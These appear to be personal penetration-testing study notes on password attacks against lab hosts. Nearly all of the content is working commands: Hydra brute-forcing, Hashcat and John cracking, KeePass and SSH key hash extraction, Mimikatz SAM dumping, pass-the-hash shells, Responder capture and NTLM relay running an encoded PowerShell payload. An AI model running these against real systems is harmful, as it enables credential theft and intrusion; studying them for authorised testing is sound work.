# Password spray
## Hydra
- ssh
- ``` hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://192.168.50.201  ```
- rdp
- ``` hydra -L /usr/share/wordlists/dirb/others/names.txt -p "SuperS3cure1337#" rdp://192.168.50.202 ```
- port: add ``` -s ```

- care 302 redirect
- HTTP POST Form
  ``` hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid" ```
- HTTP GET
  ``` hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.152.201 http-get "/index.php" ```



## Cracking with Hashcat
- Work w/ mutated password list (rockyou/other list)
- hashcat rule explained: [https://github.com/zh54321/hashcat_rule_gen ](https://hashcat.net/wiki/doku.php?id=rule_based_attack)
- writing rule to xx.rule ``` $1 $2 $3 c $!  ``` 
- running crack ``` hashcat -m 0 crackme.txt /usr/share/wordlists/rockyou.txt -r xx.rule --force  ```
- sometimes use fasttrack.txt too
- ``` c ``` in rule = captilized letter
- ``` u d ``` in rule = upper all char & duplicated once

- Hash mode: https://hashcat.net/wiki/doku.php?id=example_hashes
- Hash type analyzer: https://www.tunnelsup.com/hash-analyzer/ 

## Password manager 
- e.g. keepass
- Find all .kdbx database ``` Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue ```
- translate .kdbx to .hash ``` keepass2john Database.kdbx > keepass.hash ```
- trim unwanted text e.g. $database: 
- using hashcat func w/ keepass lib ``` hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force ``` 

## SSH Passphrase
- DONT GRANT TOO MUCH RIGHTS TO id_rsa | 600 is enough
- can get id_rsa , still need crack paraphase
- using ssh2john
- trim hash e.g. id_rsa:
- ``` hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force ```

**
- possible to dump thru ``` ./50383.sh target.txt /home/alfred/.ssh/id_rsa ```
- For ecdsa ssh-keygen private key name: ``` id_ecdsa ```

## john
- if some pre-defined module not work, use john directly
- ssh to john for john eat ``` ssh2john id_rsa>xx.hash``` (Remember copy Beign --- Private key to --- End private key)
- create new rule to john.conf ``` sudo sh -c 'cat /home/kali/Downloads/ssh.rule >> /etc/john/john.conf'```
- run it ``` john --wordlist=ssh.passwords --rules=sshRules ssh.hash ```
- [EASY] OR without rules ``` john --wordlist=/usr/share/wordlists/rockyou.txt xx.hash ``` 

# NTLM v1
- More like high priv users
## Brute force NTLM (Windows) MUST USE POWERSHELL!!!
- Target get from window SAM
- find all users ``` Get-LocalUser ```
- w/ mimikatz (need access)
- check oscp cheat sheet for more commands
- ``` token::elevate ``` esculate to system
- get all token ``` lsadump::sam ``` & find the user + hash ntlm u want to breach
- hashcat: ``` hashcat -m 1000 nelly.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force ```

## Non-crack way | Pass NTLM to another service
### SMB server 
- sometimes smb server 1 same passwod = server 2, then it works w/ using same NTLM-hash


### leveragable tools w/ hash
1. smbclient
   - ``` smbclient \\\\192.168.50.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b ```
2. CrackMapExec
3. impacket_
4. psexec.py (shell with system identity)
5. wmiexec.py (shell with admin identity)
   - rmb add 32 zeros before the hash 
   - ``` impacket-wmiexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@192.168.50.212 ```

# NTLM v2
- More like unpriv users
## Crack
- ``` net user xxx``` see if can rdp
- ``` sudo responder -I tun0 ``` rogue receiver to dump request from http , smb etc
- ``` dir \\LHOST\test ``` to post hash NTLM
- NTLM v2 Hash crack

## Skill of including filename of smb for HTTP server load uploaded file
- change file name to ``` \\\\LHOST\\share\file.name ```
- Trigger call NTLM hash

## Forwarding the hash instill of crack since too hard
- relay server for NTLM ``` impacket-ntlmrelayx --no-http-server -smb2support -t {target vicim ip} -c "powershell -enc JABjAGwAaQBlAG4AdA..." ```
- use victim A to connect our rogue impacket server by dir \\xx\y
- watch shell if have thing come

